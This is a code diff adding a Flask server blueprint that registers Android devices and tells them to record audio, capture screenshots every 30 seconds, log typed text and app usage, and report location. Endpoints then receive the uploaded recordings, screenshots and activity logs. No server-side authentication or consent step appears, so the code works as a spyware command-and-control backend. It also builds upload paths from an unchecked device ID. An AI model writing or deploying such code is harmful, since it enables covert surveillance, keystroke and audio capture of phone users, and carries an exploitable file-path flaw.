@@ -1,0 +1,323 @@
+from flask import Blueprint, request, jsonify
+from src.models.device import db, Device, AudioFile, Screenshot, ActivityLog
+from datetime import datetime
+import json
+import os
+
+android_bp = Blueprint('android', __name__)
+
+@android_bp.route('/register', methods=['POST'])
+def register_device():
+    """Register Android device"""
+    try:
+        data = request.get_json()
+        
+        device_id = data.get('device_id')
+        if not device_id:
+            return jsonify({'success': False, 'error': 'Device ID is required'}), 400
+        
+        # Check if device exists, if not create it
+        device = Device.query.get(device_id)
+        if not device:
+            device = Device(
+                id=device_id,
+                name=data.get('device_name', f'Android Device {device_id}'),
+                device_type='android',
+                status='connected',
+                battery_level=data.get('battery_level', 0),
+                location=data.get('location', '')
+            )
+            db.session.add(device)
+        else:
+            # Update existing device
+            device.status = 'connected'
+            device.last_activity = datetime.utcnow()
+            if data.get('battery_level') is not None:
+                device.battery_level = data['battery_level']
+            if data.get('location'):
+                device.location = data['location']
+        
+        db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'device_id': device.id,
+            'message': 'Device registered successfully'
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@android_bp.route('/heartbeat', methods=['POST'])
+def device_heartbeat():
+    """Device heartbeat to update status"""
+    try:
+        data = request.get_json()
+        device_id = data.get('device_id')
+        
+        if not device_id:
+            return jsonify({'success': False, 'error': 'Device ID is required'}), 400
+        
+        device = Device.query.get(device_id)
+        if not device:
+            return jsonify({'success': False, 'error': 'Device not found'}), 404
+        
+        # Update device status
+        device.status = data.get('status', 'connected')
+        device.last_activity = datetime.utcnow()
+        
+        if data.get('battery_level') is not None:
+            device.battery_level = data['battery_level']
+        if data.get('location'):
+            device.location = data['location']
+        
+        # Update service status
+        services = data.get('services', {})
+        if 'audio_recording' in services:
+            device.audio_recording = services['audio_recording']
+        if 'screenshot_capture' in services:
+            device.screenshot_capture = services['screenshot_capture']
+        if 'activity_monitoring' in services:
+            device.activity_monitoring = services['activity_monitoring']
+        
+        db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'message': 'Heartbeat received'
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@android_bp.route('/commands/<device_id>', methods=['GET'])
+def get_device_commands(device_id):
+    """Get pending commands for device"""
+    try:
+        device = Device.query.get(device_id)
+        if not device:
+            return jsonify({'success': False, 'error': 'Device not found'}), 404
+        
+        # In a real implementation, you would have a commands queue
+        # For now, we'll return the current service states as commands
+        commands = []
+        
+        # Check if services should be started/stopped based on database state
+        if device.audio_recording:
+            commands.append({
+                'command': 'start_audio_recording',
+                'parameters': {
+                    'quality': 'high',
+                    'segment_duration': 60
+                }
+            })
+        else:
+            commands.append({
+                'command': 'stop_audio_recording',
+                'parameters': {}
+            })
+        
+        if device.screenshot_capture:
+            commands.append({
+                'command': 'start_screenshot_capture',
+                'parameters': {
+                    'interval': 30
+                }
+            })
+        else:
+            commands.append({
+                'command': 'stop_screenshot_capture',
+                'parameters': {}
+            })
+        
+        if device.activity_monitoring:
+            commands.append({
+                'command': 'start_activity_monitoring',
+                'parameters': {}
+            })
+        else:
+            commands.append({
+                'command': 'stop_activity_monitoring',
+                'parameters': {}
+            })
+        
+        return jsonify({
+            'success': True,
+            'commands': commands
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@android_bp.route('/upload/audio', methods=['POST'])
+def upload_audio():
+    """Upload audio file from Android device"""
+    try:
+        device_id = request.form.get('device_id')
+        if not device_id:
+            return jsonify({'success': False, 'error': 'Device ID is required'}), 400
+        
+        device = Device.query.get(device_id)
+        if not device:
+            return jsonify({'success': False, 'error': 'Device not found'}), 404
+        
+        if 'audio_file' not in request.files:
+            return jsonify({'success': False, 'error': 'No audio file provided'}), 400
+        
+        file = request.files['audio_file']
+        if file.filename == '':
+            return jsonify({'success': False, 'error': 'No file selected'}), 400
+        
+        # Create uploads directory
+        upload_dir = os.path.join(os.path.dirname(__file__), '..', 'uploads', 'audio', device_id)
+        os.makedirs(upload_dir, exist_ok=True)
+        
+        # Generate filename with timestamp
+        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+        filename = f"recording_{timestamp}.m4a"
+        file_path = os.path.join(upload_dir, filename)
+        
+        # Save file
+        file.save(file_path)
+        file_size = os.path.getsize(file_path)
+        
+        # Save to database
+        audio_file = AudioFile(
+            device_id=device_id,
+            filename=filename,
+            file_path=file_path,
+            file_size=file_size,
+            duration=request.form.get('duration', type=int)
+        )
+        
+        db.session.add(audio_file)
+        db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'file_id': audio_file.id,
+            'message': 'Audio file uploaded successfully'
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@android_bp.route('/upload/screenshot', methods=['POST'])
+def upload_screenshot():
+    """Upload screenshot from Android device"""
+    try:
+        device_id = request.form.get('device_id')
+        if not device_id:
+            return jsonify({'success': False, 'error': 'Device ID is required'}), 400
+        
+        device = Device.query.get(device_id)
+        if not device:
+            return jsonify({'success': False, 'error': 'Device not found'}), 404
+        
+        if 'screenshot' not in request.files:
+            return jsonify({'success': False, 'error': 'No screenshot provided'}), 400
+        
+        file = request.files['screenshot']
+        if file.filename == '':
+            return jsonify({'success': False, 'error': 'No file selected'}), 400
+        
+        # Create uploads directory
+        upload_dir = os.path.join(os.path.dirname(__file__), '..', 'uploads', 'screenshots', device_id)
+        os.makedirs(upload_dir, exist_ok=True)
+        
+        # Generate filename with timestamp
+        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+        filename = f"screenshot_{timestamp}.png"
+        file_path = os.path.join(upload_dir, filename)
+        
+        # Save file
+        file.save(file_path)
+        file_size = os.path.getsize(file_path)
+        
+        # Save to database
+        screenshot = Screenshot(
+            device_id=device_id,
+            filename=filename,
+            file_path=file_path,
+            file_size=file_size
+        )
+        
+        db.session.add(screenshot)
+        db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'file_id': screenshot.id,
+            'message': 'Screenshot uploaded successfully'
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@android_bp.route('/log/activity', methods=['POST'])
+def log_activity():
+    """Log device activity from Android device"""
+    try:
+        data = request.get_json()
+        device_id = data.get('device_id')
+        
+        if not device_id:
+            return jsonify({'success': False, 'error': 'Device ID is required'}), 400
+        
+        device = Device.query.get(device_id)
+        if not device:
+            return jsonify({'success': False, 'error': 'Device not found'}), 404
+        
+        activity = ActivityLog(
+            device_id=device_id,
+            activity_type=data.get('activity_type', 'unknown'),
+            content=data.get('content', ''),
+            meta_data=json.dumps(data.get('metadata', {}))
+        )
+        
+        db.session.add(activity)
+        db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'activity_id': activity.id,
+            'message': 'Activity logged successfully'
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@android_bp.route('/config/<device_id>', methods=['GET'])
+def get_device_config(device_id):
+    """Get configuration for Android device"""
+    try:
+        device = Device.query.get(device_id)
+        if not device:
+            return jsonify({'success': False, 'error': 'Device not found'}), 404
+        
+        config = {
+            'audio_recording': {
+                'enabled': device.audio_recording,
+                'quality': 'high',
+                'format': 'm4a',
+                'segment_duration': 60,
+                'upload_interval': 300  # 5 minutes
+            },
+            'screenshot_capture': {
+                'enabled': device.screenshot_capture,
+                'interval': 30,
+                'quality': 'high',
+                'format': 'png',
+                'upload_interval': 300  # 5 minutes
+            },
+            'activity_monitoring': {
+                'enabled': device.activity_monitoring,
+                'log_text_input': True,
+                'log_app_usage': True,
+                'upload_interval': 60  # 1 minute
+            },
+            'heartbeat_interval': 30,  # 30 seconds
+            'server_url': request.host_url.rstrip('/')
+        }
+        
+        return jsonify({
+            'success': True,
+            'config': config
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
